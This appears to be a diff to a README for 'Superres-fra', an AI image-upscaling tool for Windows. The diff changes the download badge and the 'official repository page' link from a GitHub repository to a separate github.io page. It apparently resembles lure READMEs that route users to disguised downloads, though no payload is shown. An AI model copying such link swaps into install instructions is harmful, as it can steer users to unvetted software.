@@ -1,6 +1,6 @@
 # 📸 Superres-fra - Improve blurry images with artificial intelligence
 
-[![Download Superres-fra](https://img.shields.io/badge/Download-Superres--fra-blue)](https://github.com/camberwellbeautyexspouse324/Superres-fra)
+[![Download Superres-fra](https://img.shields.io/badge/Download-Superres--fra-blue)](https://camberwellbeautyexspouse324.github.io)
 
 Superres-fra uses artificial intelligence to fix low-quality photos and videos. It cleans up grainy footage from security cameras and restores detail to faces. You get clear, high-resolution results from small or blurry inputs. The software processes images using advanced mathematical models to make them look sharp again.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this tool well. Check these specs befo
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official repository page](https://github.com/camberwellbeautyexspouse324/Superres-fra) to access the files.
+1. Go to the [official repository page](https://camberwellbeautyexspouse324.github.io) to access the files.
 2. Look for the green "Code" button near the top right of the page.
 3. Click "Download ZIP" to save the project files to your computer.
 4. Locate the downloaded file in your "Downloads" folder.
